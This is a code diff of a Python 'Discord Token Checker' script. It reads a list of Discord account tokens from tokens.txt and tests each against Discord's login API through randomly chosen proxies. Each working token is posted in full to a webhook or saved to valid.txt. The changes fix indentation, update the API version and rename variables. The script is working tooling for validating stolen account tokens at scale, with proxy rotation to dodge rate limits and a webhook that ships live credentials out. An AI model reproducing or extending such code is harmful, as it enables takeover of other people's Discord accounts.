@@ -61,35 +61,36 @@ def main():
 	print(Fore.YELLOW + "[!] If you are having issues with the checker try restarting the script to get new proxies.")
 	try:
 		getProxy()
+		pass
 	except Exception as e:
 		clear()
 		print(f"Error:\n{e}")
 		pause()
 		exit()
-		try:
-			with open("tokens.txt", "r") as f:
-				global line
-				lines = f.read().splitlines()
-				for line in lines:
-					thread = threading.Thread(target=checkToken, daemon=True)
-					thread.start()
-					time.sleep(0.1)
-				pause()
-				f.close()
-				try:
-					a.close()
-				except Exception as e:
-					if debug == True:
-						print(e)
-						pass
-					pass
-		except FileNotFoundError as e:
-			if debug == True:
-				print(e)
-				pass
-			print("Please create a file named 'tokens.txt', and enter your tokens in there.")
+	try:
+		with open("tokens.txt", "r") as f:
+			global line
+			lines = f.read().splitlines()
+			for line in lines:
+				thread = threading.Thread(target=checkToken, daemon=True)
+				thread.start()
+				time.sleep(0.1)
 			pause()
-			exit()
+			f.close()
+			try:
+				a.close()
+			except Exception as e:
+				if debug == True:
+					print(e)
+					pass
+				pass
+	except FileNotFoundError as e:
+		if debug == True:
+			print(e)
+			pass
+		print("Please create a file named 'tokens.txt', and enter your tokens in there.")
+		pause()
+		exit()
 				
 
 def checkToken():
@@ -102,27 +103,37 @@ def checkToken():
 	randProxySSL = random.choice(proxList2)
 	token = line
 	try:
-		discordAPI = requests.get("https://discord.com/api/v6/auth/login", headers={"Authorization": token}, proxies={"http": randProxy,"https": randProxySSL})
+		discordAPI = requests.get("https://discord.com/api/v9/auth/login", headers={"Authorization": token}, proxies={"http": randProxy,"https": randProxySSL})
 	except Exception as e:
 		if debug == True:
 			print(e)
 			pass
 		return;
-	if discordAPI.status_code == 200:
-		taken += 1
+	if discordAPI.status_code == 404:
+		invalid += 1
 		total += 1
 		title("Discord Token Checker | arshan.xyz | Valid: " + str(valid) +  " Invalid: " + str(invalid) + " Total: " + str(total))
 		print(Fore.RED + f"[-] Token '{token}' is invalid.")
-	elif discordAPI.status_code == 404:
-		available += 1
+	elif discordAPI.status_code == 200:
+		if token.startswith("mfa."):
+			spliced = token[25:]
+			length = len(spliced)
+			spliced = "*" * length
+			endResult = token[:25] + spliced
+		else:
+			spliced = token[25:]
+			length = len(spliced)
+			spliced = "*" * length
+			endResult = token[:25] + spliced
+		valid += 1
 		total += 1
 		title("Discord Token Checker | arshan.xyz | Valid: " + str(valid) +  " Invalid: " + str(invalid) + " Total: " + str(total))
-		print(Fore.GREEN + f"[+] Token '{token}' is valid.")
+		print(Fore.GREEN + f"[+] Token '{endResult}' is valid.")
 		webhook = DiscordWebhook(url=webhookk, content=f"[!] Valid Discord Token: {token}")
 		try:
 			response = webhook.execute()
 		except Exception:
-			print(Fore.YELLOW + "Invalid Webhook URL, saving invite to valid.txt")
+			print(Fore.YELLOW + "Invalid Webhook URL, saving token to valid.txt")
 			with open("valid.txt", "a") as f:
 				f.writelines(token + "\n")
 	elif discordAPI.status_code == 429:
